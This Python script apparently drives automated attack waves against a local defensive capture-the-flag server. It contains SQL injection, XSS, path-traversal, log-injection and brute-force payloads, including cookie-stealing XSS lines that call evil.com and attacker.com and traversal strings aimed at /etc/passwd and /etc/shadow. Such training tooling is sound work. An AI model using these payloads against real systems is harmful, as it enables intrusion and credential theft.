#!/usr/bin/env python3
"""
CTF Challenge: Operation Firewall Breach
Automated Attacker - Sends waves of attacks automatically every N seconds.
Participants must DEFEND against these, not run this themselves.
"""

import requests
import time
import random
import threading
import sys
import json
from datetime import datetime

TARGET = "http://localhost:8888"
WAVE_INTERVAL = 15   # seconds between full attack waves
JITTER_MAX    = 3    # random delay per attack to simulate real traffic

BANNER = r"""
 ██████╗████████╗███████╗      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝╚══██╔══╝██╔════╝     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║        ██║   █████╗       ███████║   ██║      ██║   ███████║██║     █████╔╝ █████╗  ██████╔╝
██║        ██║   ██╔══╝       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚██████╗   ██║   ██║          ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚═════╝   ╚═╝   ╚═╝          ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
              AUTOMATED THREAT ENGINE — OPERATION: FIREWALL BREACH CTF
"""

# ─── Attack Payloads ─────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT username,password FROM users--",
    "'; DROP TABLE users;--",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert('pwned')>",
    "<body onload=fetch('http://evil.com?c='+document.cookie)>",
    "'\"><script>document.location='http://attacker.com'</script>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "....//....//etc/passwd",
    "../flag_system/flag.enc",
    "../../server/users.db",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

LOG_INJECTION_PAYLOADS = [
    "normal message\nINFO 2024-01-01 [SYSTEM] Admin password reset\n",
    "test\r\nWARNING: flag{fake_flag_here}",
    "msg|CRITICAL|admin logged in|flag exfiltrated",
    "hello\nERROR [AUTH] Password for admin changed to: hacked",
]

BRUTE_FORCE_USERS = ["admin", "administrator", "root", "superuser"]
BRUTE_FORCE_PASSWORDS = [
    "password", "123456", "admin", "letmein", "qwerty",
    "password1", "abc123", "monkey", "1234567", "dragon",
    "sup3rs3cr3t!", "P@ssw0rd", "admin123", "root123",
]

# ─── Attack Functions ─────────────────────────────────────────────────────────

stats = {
    "sqli": {"sent": 0, "blocked": 0},
    "xss": {"sent": 0, "blocked": 0},
    "path_traversal": {"sent": 0, "blocked": 0},
    "brute_force": {"sent": 0, "blocked": 0},
    "log_injection": {"sent": 0, "blocked": 0},
}

def jitter():
    time.sleep(random.uniform(0, JITTER_MAX))

def log_attack(vector, payload, response):
    status = response.status_code
    blocked = status in (403, 429)
    stats[vector]["sent"] += 1
    if blocked:
        stats[vector]["blocked"] += 1
    icon = "✓ BLOCKED" if blocked else "✗   HIT  "
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  [{ts}] [{vector.upper():15s}] {icon} | HTTP {status} | {payload[:50]}")
    return blocked

def attack_sqli():
    payload = random.choice(SQLI_PAYLOADS)
    try:
        r = requests.post(
            f"{TARGET}/login",
            data={"username": "admin", "password": payload},
            timeout=5
        )
        log_attack("sqli", payload, r)
    except Exception as e:
        print(f"  [SQLI] Connection error: {e}")

def attack_xss():
    payload = random.choice(XSS_PAYLOADS)
    try:
        r = requests.get(f"{TARGET}/search", params={"q": payload}, timeout=5)
        log_attack("xss", payload, r)
    except Exception as e:
        print(f"  [XSS] Connection error: {e}")

def attack_path_traversal():
    payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
    try:
        r = requests.get(f"{TARGET}/file", params={"name": payload}, timeout=5)
        log_attack("path_traversal", payload, r)
    except Exception as e:
        print(f"  [PATH_TRAVERSAL] Connection error: {e}")

def attack_brute_force():
    user = random.choice(BRUTE_FORCE_USERS)
    pwd  = random.choice(BRUTE_FORCE_PASSWORDS)
    try:
        r = requests.post(
            f"{TARGET}/login",
            data={"username": user, "password": pwd},
            timeout=5
        )
        log_attack("brute_force", f"{user}:{pwd}", r)
    except Exception as e:
        print(f"  [BRUTE_FORCE] Connection error: {e}")

def attack_log_injection():
    payload = random.choice(LOG_INJECTION_PAYLOADS)
    try:
        r = requests.post(f"{TARGET}/log", data={"msg": payload}, timeout=5)
        log_attack("log_injection", payload, r)
    except Exception as e:
        print(f"  [LOG_INJECTION] Connection error: {e}")

def print_stats():
    print(f"\n  {'─'*55}")
    print(f"  {'ATTACK STATISTICS':^55}")
    print(f"  {'─'*55}")
    for v, s in stats.items():
        pct = int(s["blocked"] / s["sent"] * 100) if s["sent"] else 0
        bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
        print(f"  {v:<18} {s['blocked']:>3}/{s['sent']:<3} blocked  [{bar}] {pct}%")
    print(f"  {'─'*55}\n")

# ─── Wave Runner ─────────────────────────────────────────────────────────────

wave_number = 0

def run_wave():
    global wave_number
    wave_number += 1
    print(f"\n{'='*60}")
    print(f"  ⚡  WAVE {wave_number} — {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*60}")

    # Run all attacks in parallel threads with jitter
    threads = []
    attack_funcs = [
        attack_sqli,
        attack_xss,
        attack_path_traversal,
        attack_brute_force,
        attack_log_injection,
    ]

    # Each attack fires 2-3 times per wave to simulate persistence
    for func in attack_funcs:
        repeats = random.randint(2, 3)
        for _ in range(repeats):
            t = threading.Thread(target=lambda f=func: (jitter(), f()))
            threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print_stats()

    # Check server status
    try:
        r = requests.get(f"{TARGET}/status", timeout=5)
        if r.status_code == 200:
            data = r.json()
            blocked = data.get("blocked_count", 0)
            total   = data.get("total_vectors", 5)
            print(f"  [STATUS] {blocked}/{total} attack vectors currently blocked by defenders")
            if data.get("all_blocked"):
                print("\n  🏆 ALL VECTORS BLOCKED! Flag should be accessible now.")
    except:
        pass

def main():
    print(BANNER)
    print(f"  Target  : {TARGET}")
    print(f"  Interval: Every {WAVE_INTERVAL}s")
    print(f"  Vectors : SQLi | XSS | Path Traversal | Brute Force | Log Injection")
    print(f"\n  Waiting 3 seconds for server to be ready...\n")
    time.sleep(3)

    while True:
        run_wave()
        print(f"  Next wave in {WAVE_INTERVAL} seconds...")
        time.sleep(WAVE_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  [ATTACKER] Attack engine stopped.")
        print_stats()
